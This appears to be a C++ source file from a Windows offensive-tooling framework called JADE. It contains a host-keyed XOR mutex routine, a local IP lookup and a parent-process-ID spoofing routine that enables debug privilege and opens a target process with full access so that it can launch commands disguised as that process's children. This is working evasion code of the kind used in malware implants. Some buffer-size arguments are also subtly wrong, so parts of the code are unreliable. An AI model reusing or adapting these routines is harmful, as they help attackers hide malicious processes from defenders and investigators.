#include "JADE.h"

// JADE.cpp : This file contains the custom functions used throughout Windows JADE framework
//
#ifndef _WIN32_WINNT            // Specifies that the minimum required platform is Windows Vista.
#define _WIN32_WINNT 0x0600     // Change this to the appropriate value to target other versions of Windows.
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#endif
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <winsock.h>
#include <TlHelp32.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"iphlpapi")

// ******************************** XOR MUTEX FUNCTION ******************************

HANDLE 
XOR_Mutex(char xorkey[5])
{
	char hostname[128] = "";
	char mutexname[128] = { '\0' };
	int keysz = strlen(xorkey);
	WSADATA wsadata;
	
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	if (gethostname(hostname, sizeof(hostname)) != 0)
		return NULL;

	for (unsigned int i = 0; i < strlen(hostname); i++)
		mutexname[i] = ((hostname[i] - '0') ^ (xorkey[i % keysz] - '0')) + '0';

	return CreateMutexA(NULL, FALSE, mutexname);

}

// ******************************** Get Local IP Address *******************************
DWORD
GetLocalIP(char* ipstr)
{
	DWORD index;
	IPAddr test = inet_addr("8.8.8.8");
	GetBestInterface(test, &index);

	DWORD asize = 20000;
	PIP_ADAPTER_ADDRESSES_LH adapters = NULL;

	do {
		adapters = (PIP_ADAPTER_ADDRESSES_LH)malloc(asize);

		if (!adapters) {
			return -1;
		}
		int r = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, 0, adapters, &asize);
		if (r == ERROR_BUFFER_OVERFLOW) {
			free(adapters);
		}
		else if (r == ERROR_SUCCESS) {
			break;
		}
		else {
			free(adapters);
			return -1;
		}
	} while (!adapters);

	PIP_ADAPTER_ADDRESSES_LH adapter = adapters;

	while (adapter) {
		if (adapter->IfIndex == index) {

			PIP_ADAPTER_UNICAST_ADDRESS address = adapter->FirstUnicastAddress;
			while (address) {
				if (address->Address.lpSockaddr->sa_family == AF_INET) {

					getnameinfo(address->Address.lpSockaddr,
						address->Address.iSockaddrLength,
						ipstr, sizeof(ipstr), 0, 0, NI_NUMERICHOST);
				}
				address = address->Next;
			}
		}
		adapter = adapter->Next;
	}
	free(adapters);
	return 0;
}

// ******************************* PARENT SPOOF FUNCTIONS ******************************

// update current process' token to hold the debug privileges in order to set the
// parent process id of the to-be-spawned process
bool
AdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

// Run through all processes in the process list to get the PID by process name
DWORD
GetParentPID(const char *proc_name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snap, &entry) == TRUE)
	{
		do {
			if (strncmp(proc_name, (char*)entry.szExeFile, strlen(proc_name)) == 0)
				return entry.th32ProcessID;
		} while (Process32Next(snap, &entry) == TRUE);
	}

	return 0;
}

// main function to handle spoofing a parent process id for a given process
int
SpoofParent(char* commandline, const char* parent_req)
{
	STARTUPINFOEXA sie = { sizeof(sie) };
	STARTUPINFOA sui;
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = GetParentPID(parent_req);

	if (dwPid == 0)
		return -1;

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	if (pAttributeList == NULL)
		return -1;
	
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
		return -1;

	if (!AdjustToken()) {
		char buf[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(), 0, buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
		printf("%s\n", buf);
		return -1;
	}

	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (hParentProcess == NULL) {
		char buf[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(), 0, buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
		printf("%s\n", buf);
		return -1;
	}

	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		return -1;
	
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(STARTUPINFOEXA);
	sui.dwFlags = STARTF_USESHOWWINDOW;
	sie.StartupInfo = sui;
	sie.lpAttributeList = pAttributeList;

	if (!CreateProcessA(NULL, commandline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi)) {
		char buf[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(), 0, buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
		printf("%s\n", buf);
		return -1;
	}

	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hParentProcess);

	return 0;
}
